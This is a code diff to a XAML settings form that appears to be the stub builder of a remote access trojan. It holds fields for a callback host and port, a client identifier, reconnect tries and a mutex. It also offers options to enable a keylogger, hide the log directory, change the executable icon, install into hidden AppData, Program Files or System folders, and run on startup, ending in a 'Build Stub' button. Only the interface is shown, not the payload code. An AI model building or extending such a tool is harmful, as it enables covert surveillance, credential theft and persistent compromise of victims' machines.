@@ -21,8 +21,10 @@
 
         <Grid Background="White" Panel.ZIndex="99" Grid.Row="0">
             <StackPanel Orientation="Horizontal" VerticalAlignment="Top" Margin="0 -2">
-                <Button Uid="0" Width="150" Content="Connexion Settings" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
-                <Button Uid="1" Width="150" Content="Basic Settings" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
+                <Button Uid="0" Width="150" Content="Network" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
+                <Button Uid="1" Width="150" Content="Standard" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
+                <Button Uid="2" Width="150" Content="Installation" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
+
             </StackPanel>
             <Grid x:Name="GridCursor" Width="150" Height="4" Background="#4a9ff5" Margin="0 20 0 0" HorizontalAlignment="Left"/>
         </Grid>
@@ -34,25 +36,39 @@
 
                         <StackPanel Orientation="Vertical">
                             <Label FontWeight="Medium" FontSize="25" Content="Connexion"></Label>
+                        <StackPanel Margin=" 0 15 0 0" Orientation="Horizontal">
+    
+                            <TextBlock Margin="0 0 15 0" Padding="0" VerticalAlignment="Center" Text="Ip Address / Hostname :"/>
+                            <TextBox x:Name="txtHost" Style="{x:Null}" VerticalAlignment="Bottom" Width="200" 
+                                     Text=""/>
 
-                            <TextBlock Margin="0 15 0 0" Padding="0" VerticalAlignment="top" Text="Ip Address / Hostname :"/>
-                            <TextBox x:Name="txtHost" Style="{x:Null}" HorizontalAlignment="Left" Text="127.0.0.1" Width="200" />
-
-                            <TextBlock  Margin="0 2 0 0" Padding="0" VerticalAlignment="top" Text="Port :"/>
-                            <StackPanel Margin="0 -5" Orientation="Horizontal">
-                                <TextBox Style="{x:Null}" x:Name="txtPort" x:FieldModifier="private" Margin="0,5,0,5" Width="70" Text="4444" FontSize="11" />
-                                <Button Style="{x:Null}" x:Name="cmdDown" x:FieldModifier="private" Margin="0,5,0,5" FontSize="11"  Content="-" Width="15"  />
-                                <Button Style="{x:Null}" x:Name="cmdUp" x:FieldModifier="private" Margin="0,5,0,5" FontSize="11" Content="+" Width="15"  />
+                            <TextBlock  Margin="15 0" Padding="0" VerticalAlignment="Center" Text="Port :"/>
+                            <StackPanel Margin="0 -5" Orientation="Horizontal" VerticalAlignment="Bottom">
+                                <TextBox Style="{x:Null}" x:Name="txtPort" x:FieldModifier="private" Margin="0,5,0,5" Width="70" FontSize="11"
+                                          Text="0" TextChanged="txtNum_TextChanged"/>
+                                <Button Style="{x:Null}" x:Name="cmdDown" x:FieldModifier="private" Margin="0,5,0,5" FontSize="11"  Content="-" Width="15"  
+                                        Click="cmdDown_Click"/>
+                                <Button Style="{x:Null}" x:Name="cmdUp" x:FieldModifier="private" Margin="0,5,0,5" FontSize="11" Content="+" Width="15" 
+                                        Click="cmdUp_Click"/>
                             </StackPanel>
-                            <TextBlock Margin="0 2 0 0" Padding="0" VerticalAlignment="top" Text="Client Tag :"/>
-                            <TextBox x:Name="txtClientTag" Text="" Style="{x:Null}" Margin="0 0 0 0"  HorizontalAlignment="Left"  Width="200" />
+                        </StackPanel>
+                        <StackPanel Margin="0 15 0 0" Orientation="Horizontal">
+                            <TextBlock Margin="0 0 55 0" Padding="0" VerticalAlignment="top" Text="Client Identifier :"/>
+                            <TextBox x:Name="txtClientID" Text="" Style="{x:Null}" Margin="0 0 0 0"  HorizontalAlignment="Left"  Width="200" />
+                        </StackPanel>
+                            <StackPanel Margin="0 15 0 0" Orientation="Horizontal">
+                                <TextBlock  Margin="0 0 55 0" Padding="0" VerticalAlignment="top" Text="Reconnect tries :"/>
+                                <StackPanel Margin="0 -5" Orientation="Horizontal">
+                                    <TextBox Style="{x:Null}" x:Name="txtRecoTries" x:FieldModifier="private" Margin="0,5,0,5" Width="70" FontSize="11"
+                                            Text="3000" TextChanged="txtReco_TextChanged"/>
+                                    <Button Style="{x:Null}" Margin="0,5,0,5" FontSize="11"  Content="-" Width="15"  
+                                            Click="recoCmdDown_Click"/>
+                                    <Button Style="{x:Null}" Margin="0,5,0,5" FontSize="11" Content="+" Width="15"  
+                                            Click="recoCmdUp_Click"/>
+                                </StackPanel>
 
-                            <TextBlock  Margin="0 2 0 0" Padding="0" VerticalAlignment="top" Text="Reconnect tries :"/>
-                            <StackPanel Margin="0 -5" Orientation="Horizontal">
-                                <TextBox Style="{x:Null}" x:Name="txtRecoTries" x:FieldModifier="private" Margin="0,5,0,5" Width="70" Text="3000" FontSize="11" />
-                                <Button Style="{x:Null}" Margin="0,5,0,5" FontSize="11"  Content="-" Width="15"  />
-                                <Button Style="{x:Null}" Margin="0,5,0,5" FontSize="11" Content="+" Width="15"  />
                             </StackPanel>
+
                             
                             <Label Margin="0 15" FontWeight="Medium" FontSize="25" Content="Mutex"></Label>
 
@@ -74,7 +90,7 @@
 
                             <CheckBox Margin="0 15 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
                                       x:Name="chkKeyLogger" Click="chkKeyLoggerEvent">
-                                Enable keyboard logging.
+                                Enable keylogger.
                             </CheckBox>
 
                             <StackPanel Orientation="Vertical">
@@ -85,15 +101,14 @@
 
                             <CheckBox Margin="0 15 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
                                       x:Name="chkDirHidden">
-                                Set directory to hidden.
+                                Hide log directory.
                             </CheckBox>
 
                             <Label Margin="0 15" FontWeight="Medium" FontSize="25" Content="Set Icon"></Label>
 
-
                             <StackPanel Orientation="Vertical">
                                 <CheckBox x:Name="chkIcon" Style="{StaticResource MaterialDesignAccentCheckBox}" IsEnabled="False" Background="#4a9ff5" Foreground="black" FontSize="11" >
-                                    Change Assembly Icon.
+                                    Change Executable Icon.
                                 </CheckBox>
                                 <StackPanel Margin="0 0 0 0" VerticalAlignment="Top" Orientation="Horizontal">
                                     <TextBox Style="{x:Null}" Text="" Width="300" IsEnabled="False" />
@@ -103,12 +118,72 @@
                         </StackPanel>
                         
                     </TabItem>
+
+                    <TabItem Style="{StaticResource lineTabItem}">
+
+                        <StackPanel Orientation="Vertical">
+                            <Label FontWeight="Medium" FontSize="25" Content="Installation"></Label>
+
+                            <CheckBox Margin="0 15 0 0" x:Name="chkInstall" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                                       Click="chkInstallEvent" IsEnabled="False">
+                                Add client to system path.
+                            </CheckBox>
+
+                            <StackPanel x:Name="radioGroup" IsEnabled="False" Orientation="Vertical">
+                                <TextBlock x:Name="lblDirectory" Foreground="LightGray" Margin="0 15 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
+                                           Text="Directory :" />
+                                <StackPanel Margin="15 0 0 0">
+                                    <RadioButton Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 15 0 0" GroupName="Os" Content="User / AppData" IsChecked="True"/>
+                                    <RadioButton Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="Program Files"/>
+                                    <RadioButton Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="System"/>
+                                </StackPanel>
+                            </StackPanel>
+                            
+                            <StackPanel x:Name="spSubDirectory" IsEnabled="False" Orientation="Vertical">
+                                <TextBlock x:Name="lblSubDirectory" Foreground="LightGray" Margin="0 15 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
+                                           Text="Subdirectory :" />
+                                <StackPanel Orientation="Horizontal">
+                                    <TextBox Style="{x:Null}" HorizontalAlignment="Left"  Width="200"/>
+                                    <CheckBox Margin ="15 0 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                                          >
+                                        set to hidden.
+                                    </CheckBox>
+                                </StackPanel>
+                            </StackPanel>
+
+                            <StackPanel x:Name="spFileName" IsEnabled="False" Orientation="Vertical">
+                                <TextBlock x:Name="lblFileName" Foreground="LightGray" Margin="0 5 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
+                                           Text="Name :" />
+                                <StackPanel Orientation="Horizontal">                                    
+                                    <TextBox Style="{x:Null}" HorizontalAlignment="Left"  Width="200"/>
+                                    <CheckBox Margin ="15 0 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                                          >
+                                        set to hidden.
+                                    </CheckBox>
+                                </StackPanel>
+                            </StackPanel>
+                            <Label Margin="0 15 0 15" FontWeight="Medium" FontSize="25" Content="Startup"></Label>
+
+                            <StackPanel Orientation="Vertical">
+                                <CheckBox x:Name="chkAutoStart" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5"
+                                          Foreground="black" FontSize="11" Click="chkAutoStartEvent">
+                                    Run client on PC startup.
+                                </CheckBox>
+                                <StackPanel Margin="0 0 0 0" VerticalAlignment="Top" Orientation="Horizontal">
+                                    <TextBox x:Name="txtStartupName" Style="{x:Null}" Text="" Width="200" IsEnabled="False" />
+                                </StackPanel>
+                            </StackPanel>
+                        </StackPanel>
+
+                    </TabItem>
+                    
                 </TabControl>
             </Grid>
         </Border>
         
         <Grid Margin="10 0" Grid.Row="2">
-            <Button Style="{StaticResource btnBlue}" Margin="10 0" VerticalAlignment="Center" HorizontalAlignment="Right" Content="Build Stub" Width="150" Click="btnBuild"/>            
+            <Button Style="{StaticResource btnBlue}" Margin="10 0" VerticalAlignment="Center"
+                    HorizontalAlignment="Right" Content="Build Stub" Width="150" Click="btnBuild"/>            
         </Grid>
     </Grid>
 </UserControl>
